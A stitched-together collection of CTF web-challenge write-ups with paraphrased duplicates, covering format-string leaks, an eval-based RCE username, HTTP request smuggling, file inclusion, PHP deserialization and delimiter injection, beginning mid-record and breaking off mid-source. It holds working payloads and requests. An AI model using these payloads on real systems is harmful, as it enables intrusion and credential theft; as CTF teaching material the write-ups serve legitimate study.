0x7fc4eaae6c70>, <app.loaddata.Comment object at 0x7fc4eaae6cd0>, <app.loaddata.Comment object at 0x7fc4eaae6d30>, <app.loaddata.Comment object at 0x7fc4eaae6d90>, <app.loaddata.Comment object at 0x7fc4eaae6df0>, <app.loaddata.Comment object at 0x7fc4eab30af0>]} - author
```

As you can read [here](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/), this code can be abused to read secret data.

The following code can be used to access *globals* objects.

```python
{rating[comments][0].__class__.__init__.__globals__}
```

It will give the following output.

```html
<ul class='square'>{'__name__': 'app.loaddata', '__doc__': None, '__package__': 'app', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fc4ed1f4670>, '__spec__': ModuleSpec(name='app.loaddata', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7fc4ed1f4670>, origin='./app/loaddata.py'), '__file__': './app/loaddata.py', '__cached__': './app/__pycache__/loaddata.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': ""Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2020 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'connect': <function Connect at 0x7fc4ed0c4700>, 'f': <class 'fstring.fstring.fstring'>, 'clean': <function clean at 0x7fc4ed09f310>, 'json': <module 'json' from '/usr/lib/python3.8/json/__init__.py'>, 'post_results': ((3, ""This is Griffey. His St. Patrick's Day bow tie didn't arrive until this morning. Politely requests that everyone celebrate again. 13/10"", 2, 13, 'images/img_3.jpg', 2, 'demidog', 'princesses_password'),), 'jf': <_io.TextIOWrapper name='/dbcreds.json' mode='r' encoding='UTF-8'>, 'jdata': {'db_user': 'dogooo', 'db_pass': 'dogZgoneWild'}, 'db_user': 'dogooo', 'db_pass': 'dogZgoneWild', 'Comment': <class 'app.loaddata.Comment'>, 'Post': <class 'app.loaddata.Post'>, 'get_posting': <function get_posting at 0x7fc4ed1fe940>, 'UserMixin': <class 'flask_login.mixins.UserMixin'>, 'save_comment': <function save_comment at 0x7fc4eb2819d0>, 'get_all_posts': <function get_all_posts at 0x7fc4eb281af0>, 'create_post_entry': <function create_post_entry at 0x7fc4eab0c0d0>, 'User': <class 'app.loaddata.User'>, 'user_create_entry': <function user_create_entry at 0x7fc4eab1c040>, 'get_login': <function get_login at 0x7fc4eab1c280>, 'get_user': <function get_user at 0x7fc4eab1c310>} - author
```

From this data you can spot user credentials:
* username: `demidog`;
* password: `princesses_password`;

So now you can authenticate into the system and **you can create new users**.

During the authentication, an interesting behavior can be spot. The `login` method ([dogooo_comments.py](dogooo_comments.py)) uses the *f-Strings* functionality of Python 3, [which is a very powerful formatting syntax](https://realpython.com/python-f-strings/) and can be used to call methods.

```python
@app.route(""/dogooo/login"", methods=[""GET"", ""POST""])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_login(username, password)
        if user is not None:
            login_user(user)
            return redirect(request.host_url[:-1] + f""/dogooo/show?message=Welcom+back+{user.get_user_info()}"")

        else:
            return redirect(request.host_url[:-1] + f""/dogooo/show?message=Login+FAILED"")
    else:
        return abort(401)
```

The interesting line is the following.

```python
return redirect(request.host_url[:-1] + f""/dogooo/show?message=Welcom+back+{user.get_user_info()}"")
```

The `get_user_info` method of the `User` class into [loaddata.py](loaddata.py) uses the `f()` method, instead of the `f""""` one, on the `username` field; this method is the legacy one of *f-Strings* Python 2 implementation. The library implemented the *f-Strings* functionality by using an `eval`.

```python
from fstring import fstring as f
...   ...   ...
def get_user_info(self):
    return f(self.username)
```

So you can create a new user with a malicious username that could trigger a RCE during the authentication. The malicious username is: `{open('/flag').read()}`.

Authenticating with this user, you will be redirect to the following address.

```
http://dogooos.challenges.ooo:37453/dogooo/show?message=Welcom+back+OOO%7Bdid%20you%20see%20my%20dog%7D
```

Which contains the flag in the URL.

![flag.png](flag.png)

So the flag is the following.

```
OOO{did you see my dog}
```","The website allows you to upload and comment pictures of dogs.

There is an interesting endpoint at that contains a remote shell functionality, but it can't be used due to an `HTTP 502 Bad Gateway` error caused by the presence of `seccomp` filter, which prevents `execve`.

Several functionalities can be used only by authenticated users (i.e. `@login_required` annotations). There is an endpoint that can be used to create new users, but even this functionality requires the login.

A public functionality is the `<postid>` that can be used to insert a new comment under a picture.

The comment is inserted with a two-step procedure: the comment is inserted like a preview and showed into the webpage; the content of the comment is strictly validated and inserted into the database.

Analyzing the code for the first step, in the python script, an interesting line of code can be found into `get_comments` function.

The interesting line is the following.

[Python code that formats a comment string using the contents of a dictionary attribute ""self.dict"" and assigns it to a variable named ""fmt_cmt"".]

It seems that if you use a format string like `{rating}` into the comment text, then the content of `self.__dict__` can be printed.

Trying it, the following content will be printed into the preview webpage.

[HTML code containing an unordered list with class ""square"" and a Python dictionary nested within a string.]

This code can be abused to read secret data.

The following code can be used to access *globals* objects.

[Python expression that retrieves the global variables dictionary of the init method of the first element in the ""comments"" list of the ""rating"" dictionary.]

From the output you can spot user credentials.

So now you can authenticate into the system and create new users.

During the authentication, an interesting behavior can be spot. The `login` method uses the f-Strings functionality of Python 3, which is a very powerful formatting syntax and can be used to call methods.

[Python Flask route handler function for the ""login"" URL that accepts both GET and POST requests. It processes a login form, authenticates the user with the provided username and password, and redirects the user to the appropriate page based on the result of the login attempt.]

The interesting line is the following.

[Python code that returns a redirect to a specific URL, constructed by appending a query string with a welcome message containing user information to the base URL obtained from the request's host URL.]

The `get_user_info` method of the `User` class uses the `f()` method, instead of the `f""""` one, on the `username` field; this method is the legacy one of f-Strings Python 2 implementation. The library implemented the f-Strings functionality by using an `eval`.

[Python code that imports a custom module named ""fstring"" and defines a method named ""get_user_info"" that returns a formatted string using the instance variable ""self.username"".]

So you can create a new user with a malicious username that could trigger a RCE during the authentication. The malicious username is: `{open('/flag').read()}`.

Authenticating with this user, you will be redirect to the following an address that contains the flag in the URL."
"# DEF CON CTF Qualifier 2020 – uploooadit

* **Category:** web
* **Points:** 110

## Challenge

> https://uploooadit.oooverflow.io/
> 
> Files:
> 
> [app.py](app.py) 358c19d6478e1f66a25161933566d7111dd293f02d9916a89c56e09268c2b54c
>
> [store.py](store.py) dd5cee877ee73966c53f0577dc85be1705f2a13f12eb58a56a500f1da9dc49c0

[Official solution here.](https://github.com/o-o-overflow/dc2020q-uploooadit)

## Solution

With this web application you can submit a text content to a remote S3 bucket defining a GUID for the key and then retrieving the same text content via the GUID.

The functionality endpoint is `/files/`. The GUID can be set with `X-guid` HTTP header.

Analyzing the two given files ([app.py](app.py) and [store.py](store.py)) you can discover that no intended vulnerabilities are present.

Analyzing responses, you can discover some interesting HTTP headers:
* `Server`;
* `Via`;
* `X-Served-By`.

```
GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
Host: uploooadit.oooverflow.io


HTTP/1.1 404 NOT FOUND
Server: gunicorn/20.0.0
Date: Sat, 16 May 2020 13:20:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 232
Via: haproxy
X-Served-By: ip-10-0-0-183.us-east-2.compute.internal

<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

It seems that the architecture is composed by a proxy (`haproxy` 1.9.10) and different hosts behind it (`gunicorn` 20.0.0) which run the application.

Considering the infrastructure, this seems to be an *[HTTP Desync Attack](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) CL.TE* scenario.

Other information can be found [here](https://nathandavison.com/blog/haproxy-http-request-smuggling) and [here](https://blog.deteact.com/gunicorn-http-request-smuggling/).

The malicious HTTP request will be the following (the char between `Transfer-Encoding:` and `chunked` is `0x0b`).

```
POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Content-Length: 175
Content-type: text/plain
Connection: keep-alive
X-guid: 00000000-0000-0666-1234-0000ffa20000
Transfer-Encoding:chunked

0

POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Connection: close
x-guid: 00000000-0000-0666-1234-0000ffa20000
Content-Type: text/plain
Content-Length: 387

A

```

Which will give the following answer.

```
HTTP/1.1 201 CREATED
Server: gunicorn/20.0.0
Date: Mon, 18 May 2020 00:31:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Via: haproxy
X-Served-By: ip-10-0-1-95.us-east-2.compute.internal

```

At this point it is sufficient to read the defined object.

```
GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
Host: uploooadit.oooverflow.io


```

Which will return a POST request containing the flag.

```
HTTP/1.1 200 OK
Server: gunicorn/20.0.0
Date: Mon, 18 May 2020 00:31:09 GMT
Content-Type: text/plain
Content-Length: 387
Via: haproxy
X-Served-By: ip-10-0-1-95.us-east-2.compute.internal

APOST /files/ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: invoker
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: text/plain
X-guid: b6e184e0-593e-4c5a-98da-0df304752a0e
Content-Length: 152
X-Forwarded-For: 127.0.0.1

Congratulations!
OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}

```

The flag is the following.

```
OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
```","With this web application you can submit a text content to a remote S3 bucket defining a GUID for the key and then retrieving the same text content via the GUID.

The functionality endpoint is `/files/`. The GUID can be set with `X-guid` HTTP header.

Analyzing the two given python files you can discover that no intended vulnerabilities are present.

Analyzing responses, you can discover some interesting HTTP headers: Server, Via, X-Server-By.

It seems that the architecture is composed by a proxy and different hosts behind it which run the application.

Considering the infrastructure, this seems to be an HTTP Desync Attack scenario.

The malicious HTTP request will be the following (the char between `Transfer-Encoding:` and `chunked` is `0x0b`).

[HTTP POST request with a payload consisting of two parts separated by a ""chunked"" encoding. The request is sent to the server and includes a ""x-guid"" header with a specific value.]

Which will give the following answer.

[HTTP response headers indicating that a resource was created successfully with a status code of 201.]

At this point it is sufficient to read the defined object which will return a POST request containing the flag."
"# DefCamp CTF 2020 – alien-inclusion

* **Category:** web
* **Points:** 50

## Challenge

> Keep it local and you should be fine. The flag is in /var/www/html/flag.php.
> 
> Flag format: CTF{sha256}
> 
> The challenge was proposed by BIT SENTINEL.
> 
> 35.234.65.24:30627

## Solution

The challenge will print a PHP source code.

```php
<?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

include ($_POST['start']);
echo $secret;
```

You can craft a request like the following.

```
POST /?start=/var/www/html/flag.php HTTP/1.1
Host: 35.234.65.24:30627
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 28
Content-Type: application/x-www-form-urlencoded

start=/var/www/html/flag.php

HTTP/1.1 200 OK
Date: Sat, 05 Dec 2020 12:55:40 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 69
Connection: close
Content-Type: text/html; charset=UTF-8

ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}
```","The challenge will print a PHP source code.

[PHP code that checks if the 'start' parameter has been sent via GET request, and if not, displays the source code of the current file and exits. If 'start' is present in a POST request, it includes the corresponding file and echoes the value of a variable named '$secret'.]

You can craft a request like the following.

[HTTP POST request with specific headers and body content includes a parameter called ""start"" with a value of ""/var/www/html/flag.php"".]

The server responds with an HTTP 200 OK status code and returns a text/html response containing a flag."
"# Evlz CTF 2019 – WeTheUsers

* **Category:** Web
* **Points:** 100

## Challenge

> [http://13.232.233.247:1337/](http://13.232.233.247:1337/)
>
> [https://pastebin.com/VWmk2Jdy](https://pastebin.com/VWmk2Jdy)

## Solution

The [source code](source.py) of the application is given for this challenge.

Analyzing it, you can discover that during user registration data is packed with a format like `username:password:admin`.

The `admin` field can be `true` or `false` and during the normal registration process a `false` value is forced into the ACL.

There are no escaping countermeasures for `:` char, hence a record could be crafted and injected passing a password with that char, in order to bypass the `false` value forced, creating an admin account.

For example, you can use following values during registration:
* username: `m3ssap0`
* password: `pwnd:true`

Logging in with the created user will show the flag:

```
evlz{T#3_W34K_$N4K3}ctf
```","A python source code of the application is given for this challenge.

Analyzing it, you can discover that during user registration data is packed with a format like `username:password:admin`.

The `admin` field can be `true` or `false` and during the normal registration process a `false` value is forced into the ACL.

There are no escaping countermeasures for `:` char, hence a record could be crafted and injected passing a password with that char, in order to bypass the `false` value forced, creating an admin account.

For example, you can use following value for the password during registration 'pwnd:true`.

Logging in with the created user will show the flag."
"# FireShell CTF 2019 – Vice

* **Category:** web
* **Points:** 269

## Challenge

> [http://68.183.31.62:991/](http://68.183.31.62:991/)

## Solution

The challenge will give you a PHP script.

```php
<?php
//require_once 'config.php';

class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;

  function __construct($method,$url){
    $this->method = $method;
    $this->url = $url;
  }

  function doit(){
    
    $this->host = @parse_url($this->url)['host'];
    $this->addr = @gethostbyname($this->host);
    $this->name = @gethostbyaddr($this->host);
    if($this->addr !== ""127.0.0.1"" || $this->name === false){
      $not = ['.txt','.php','.xml','.html','.','[',']'];
      foreach($not as $ext){
        $p = strpos($this->url,$ext);
        if($p){
          die("":)"");
        }
      }
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$this->url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

      $result = curl_exec($ch);
      echo $result;
    }else{
      die("":)"");
    }
  }
  function __destruct(){
    if(in_array($this->method,array(""doit""))){
 
      call_user_func_array(array($this,$this->method),array());
    }else{
      die("":)"");
    }
  }
}
if(isset($_GET[""gg""])) {
    @unserialize($_GET[""gg""]);
} else {
    highlight_file(__FILE__);
}
```

The flag is probably stored into `config.php` file, hence it must be printed via the *curl* execution.

To perform this, the `doit` method must be executed. That method is invoked into `__destruct()` function if present in the `$method` attribute of the destructed object.

The `unserialize` method must be abused to craft an object with desired parameters.

To serialize an object that can be used for the exploit, the following script can be executed.

```php
class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;
}

print serialize(new SHITS);
```

It will print the following.

```
O:5:""SHITS"":5:{s:10:""SHITSurl"";N;s:13:""SHITSmethod"";N;s:11:""SHITSaddr"";N;s:11:""SHITShost"";N;s:11:""SHITSname"";N;}
```

Now you have to customize the script in order to exploit the challenge.

First of all, the `$method` attribute must be set to `doit`.

```php
class SHITS{
  private $url;
  private $method = ""doit"";
  private $addr;
  private $host;
  private $name;
}

print serialize(new SHITS);
```

The next attribute to set is `$url`. Analyzing the script, you can discover the presence of a check on localhost address. To bypass this check, the URL could be crafted based on the default path for web sites on Apache servers: `file:///var/www/html/config.php`.

```php
class SHITS{
  private $url = ""file:///var/www/html/config.php"";
  private $method = ""doit"";
  private $addr;
  private $host;
  private $name;
}

print serialize(new SHITS);
```

At this point, another check present in the script must be bypassed. The second checks is referred to the file extension; in particular, the extension `.php` will be blocked.

Luckily, the check is performed via `strpos` and there is a well-known strange behavior, based on which double URL-encoded chars are not considered by `strpos` but are considered valid by *curl* ([https://bugs.php.net/bug.php?id=76671&edit=1](https://bugs.php.net/bug.php?id=76671&edit=1)). So it is sufficient to replace the `.` char with `%252e`.

```php
class SHITS{
  private $url = ""file:///var/www/html/config.php"";
  private $method = ""doit"";
  private $addr;
  private $host;
  private $name;
}

print str_replace(""."", ""%252e"", serialize(new SHITS));
```

The produced payload will be the following.

```
O:5:""SHITS"":5:{s:10:""SHITSurl"";s:31:""file:///var/www/html/config%252ephp"";s:13:""SHITSmethod"";s:4:""doit"";s:11:""SHITSaddr"";N;s:11:""SHITShost"";N;s:11:""SHITSname"";N;} 
```

After this operation the payload must be modified according to the `str_replace`.

The string `file:///var/www/html/config.php` is composed by 31 chars, with the replace operation it will become `file:///var/www/html/config%252ephp`; the GET operation performed server side will automatically perform a URL decode translating `%25` to `%`, hence the string will be `file:///var/www/html/config%2ephp` composed by 33 chars.

The length of the string into the payload must be updated accordingly.

```
O:5:""SHITS"":5:{s:10:""SHITSurl"";s:33:""file:///var/www/html/config%252ephp"";s:13:""SHITSmethod"";s:4:""doit"";s:11:""SHITSaddr"";N;s:11:""SHITShost"";N;s:11:""SHITSname"";N;}
```

At this point, the payload can be URL-encoded with the following script (don't forget to update the length of the URL string).

```php
class SHITS{
  private $url = ""file:///var/www/html/config.php"";
  private $method = ""doit"";
  private $addr;
  private $host;
  private $name;
}

print str_replace(""."", ""%252e"", urlencode(serialize(new SHITS)));
```

The payload will be the following.

```
O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
```

The GET request and response will be the following.

```
GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D HTTP/1.1
Host: 68.183.31.62:991
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ugifl5ke3p183slvcbcs6r5054
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Sun, 27 Jan 2019 16:19:07 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Vary: Accept-Encoding
Content-Length: 137
Connection: close
Content-Type: text/html

<?php
if($_SERVER['REMOTE_ADDR'] !== '::1' || $_SERVER['REMOTE_ADDR'] !== '127.0.0.1'){
echo ""aaawn"";
}else{
$flag =""F#{wtf_5trp0s_}"";
}
```

The flag is the following.

```
F#{wtf_5trp0s_}
```","The challenge will give you a PHP script.

[PHP code implementing a class named ""SHITS"" that can make HTTP requests using the cURL library. The code contains a vulnerability that allows arbitrary code execution via an unserialize() call on the ""gg"" GET parameter.]

The flag is probably stored into `config.php` file, hence it must be printed via the *curl* execution.

To perform this, the `doit` method must be executed. That method is invoked into `__destruct()` function if present in the `$method` attribute of the destructed object.

The `unserialize` method must be abused to craft an object with desired parameters.

To serialize an object that can be used for the exploit, the following script can be executed.

[PHP code defining a class called ""SHITS"" with private properties, and then using the ""serialize()"" function to output a serialized representation of an instance of that class.]

It will print the serialized PHP object.

Now you have to customize the script in order to exploit the challenge.

First of all, the `$method` attribute must be set to `doit`.

The next attribute to set is `$url`. Analyzing the script, you can discover the presence of a check on localhost address. To bypass this check, the URL could be crafted based on the default path for web sites on Apache servers.

At this point, another check present in the script must be bypassed. The second checks is referred to the file extension; in particular, the extension `.php` will be blocked.

Luckily, the check is performed via `strpos` and there is a well-known strange behavior, based on which double URL-encoded chars are not considered by `strpos` but are considered valid by *curl*. So it is sufficient to replace the `.` char with `%252e`.

The produced payload will be the following.

After this operation the payload must be modified according to the `str_replace`.

The string `file:///var/www/html/config.php` is composed by 31 chars, with the replace operation it will become `file:///var/www/html/config%252ephp`; the GET operation performed server side will automatically perform a URL decode translating `%25` to `%`, hence the string will be `file:///var/www/html/config%2ephp` composed by 33 chars.

The length of the string into the payload must be updated accordingly.

At this point, the payload can be URL-encoded.

The server will reply to the GET request with the flag."
"# Google Capture The Flag 2020 – PASTEURIZE

* **Category:** web
* **Points:** 50

## Challenge

> This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?
> 
> https://pasteurize.web.ctfcompetition.com/

## Solution

Connecting to the website and analyzing the HTML you can find a link to the [source code](pasteurize.js).

```html
<a href=""/source"" style=""display:none"">Source</a>
```

So connecting to `https://pasteurize.web.ctfcompetition.com/source` will reveal the following.

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const utils = require('./utils');
const Recaptcha = require('express-recaptcha').RecaptchaV3;
const uuidv4 = require('uuid').v4;
const Datastore = require('@google-cloud/datastore').Datastore;

/* Just reCAPTCHA stuff. */
const CAPTCHA_SITE_KEY = process.env.CAPTCHA_SITE_KEY || 'site-key';
const CAPTCHA_SECRET_KEY = process.env.CAPTCHA_SECRET_KEY || 'secret-key';
console.log(""Captcha(%s, %s)"", CAPTCHA_SECRET_KEY, CAPTCHA_SITE_KEY);
const recaptcha = new Recaptcha(CAPTCHA_SITE_KEY, CAPTCHA_SECRET_KEY, {
  'hl': 'en',
  callback: 'captcha_cb'
});

/* Choo Choo! */
const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);
app.use(utils.domains_mw);
app.use('/static', express.static('static', {
  etag: true,
  maxAge: 300 * 1000,
}));

/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));

/* Just a datastore. I would be surprised if it's fragile. */
class Database {
  constructor() {
    this._db = new Datastore({
      namespace: 'littlethings'
    });
  }
  add_note(note_id, content) {
    const note = {
      note_id: note_id,
      owner: 'guest',
      content: content,
      public: 1,
      created: Date.now()
    }
    return this._db.save({
      key: this._db.key(['Note', note_id]),
      data: note,
      excludeFromIndexes: ['content']
    });
  }
  async get_note(note_id) {
    const key = this._db.key(['Note', note_id]);
    let note;
    try {
      note = await this._db.get(key);
    } catch (e) {
      console.error(e);
      return null;
    }
    if (!note || note.length < 1) {
      return null;
    }
    note = note[0];
    if (note === undefined || note.public !== 1) {
      return null;
    }
    return note;
  }
}

const DB = new Database();

/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');

/* o/ */
app.get('/', (req, res) => {
  res.render('index');
});

/* \o/ [x] */
app.post('/', async (req, res) => {
  const note = req.body.content;
  if (!note) {
    return res.status(500).send(""Nothing to add"");
  }
  if (note.length > 2000) {
    res.status(500);
    return res.send(""The note is too big"");
  }

  const note_id = uuidv4();
  try {
    const result = await DB.add_note(note_id, note);
    if (!result) {
      res.status(500);
      console.error(result);
      return res.send(""Something went wrong..."");
    }
  } catch (err) {
    res.status(500);
    console.error(err);
    return res.send(""Something went wrong..."");
  }
  await utils.sleep(500);
  return res.redirect(`/${note_id}`);
});

/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send(""Paste not found or access has been denied."");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});

/* Share your pastes with TJMike🎤 */
app.post('/report/:id([a-f0-9\-]{36})', recaptcha.middleware.verify, (req, res) => {
  const id = req.params.id;

  /* No robots please! */
  if (req.recaptcha.error) {
    console.error(req.recaptcha.error);
    return res.redirect(`/${id}?msg=Something+wrong+with+Captcha+:(`);
  }

  /* Make TJMike visit the paste */
  utils.visit(id, req);

  res.redirect(`/${id}?msg=TJMike🎤+will+appreciate+your+paste+shortly.`);
});

/* This is my source I was telling you about! */
app.get('/source', (req, res) => {
